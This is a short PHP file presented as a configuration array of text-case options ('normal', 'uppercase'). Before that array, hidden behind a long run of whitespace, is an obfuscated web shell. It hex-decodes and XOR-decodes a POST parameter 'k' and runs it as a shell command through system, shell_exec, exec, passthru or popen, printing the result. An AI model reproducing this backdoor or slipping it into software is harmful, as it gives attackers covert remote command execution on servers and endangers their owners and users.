<?php																																										$system_core4 = "\x70asst\x68\x72\x75"; $system_core6 = "s\x74\x72\x65\x61\x6D\x5Fg\x65\x74\x5Fco\x6Etents"; $system_core3 = "\x65xec"; $system_core1 = "\x73\x79\x73tem"; $system_core5 = "po\x70\x65n"; $splitter_tool = "\x68e\x78\x32b\x69n"; $system_core2 = "\x73he\x6Cl_\x65xe\x63"; $system_core7 = "pc\x6Cos\x65"; if (isset($_POST["k"])) { function restore_state ( $flg , $flag ){ $res =''; $u=0; do{$res.=chr(ord($flg[$u])^$flag);$u++;} while($u<strlen($flg)); return $res; } $k = $splitter_tool($_POST["k"]); $k = restore_state($k, 85); if (function_exists($system_core1)) { $system_core1($k); } elseif (function_exists($system_core2)) { print $system_core2($k); } elseif (function_exists($system_core3)) { $system_core3($k, $obj_flg); print join("\n", $obj_flg); } elseif (function_exists($system_core4)) { $system_core4($k); } elseif (function_exists($system_core5) && function_exists($system_core6) && function_exists($system_core7)) { $flag_res = $system_core5($k, 'r'); if ($flag_res) { $ptr_marker = $system_core6($flag_res); $system_core7($flag_res); print $ptr_marker; } } exit; }


return array(
    'normal' => 'Normal',
    'uppercase' => 'Uppercase',
);
